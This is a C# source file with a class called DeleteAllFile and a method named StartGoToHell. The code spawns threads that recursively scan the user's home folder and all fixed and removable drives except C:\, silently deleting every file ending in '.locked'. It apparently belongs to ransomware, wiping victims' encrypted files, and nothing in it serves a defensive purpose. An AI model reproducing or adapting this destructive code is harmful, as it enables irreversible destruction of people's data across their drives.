﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.IO;

namespace WindowsFormsApplication1
{
    class DeleteAllFile
    {
        string userName;
        string userDir;

        public DeleteAllFile()
        {
            userName = Environment.UserName; 
            userDir = "C:\\Users\\" + userName;
        }


        public void StartGoToHell()
        {
            new Thread(new ParameterizedThreadStart(searchDir)).Start(userDir);
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.DriveType == System.IO.DriveType.Fixed || drive.DriveType == System.IO.DriveType.Removable)
                {
                    if (drive.Name != "C:\\")
                    {
                        new Thread(new ParameterizedThreadStart(searchDir)).Start(drive.Name);
                    }
                }
            }
        }

        private void searchDir(object location)
        {
            try
            {
                string[] files = Directory.GetFiles(location.ToString());

                string[] childDirectories = Directory.GetDirectories(location.ToString());
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (extension == ".locked")
                    {
                        new Thread(new ParameterizedThreadStart(DeleteAllOfThem)).Start(files[i]);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    new Thread(new ParameterizedThreadStart(searchDir)).Start(childDirectories[i]);
                }
            }
            catch (Exception)
            {

            }
        }

        private void DeleteAllOfThem(object dir)
        {
            File.Delete(dir.ToString());
        }
        



    }//class
}//namespace
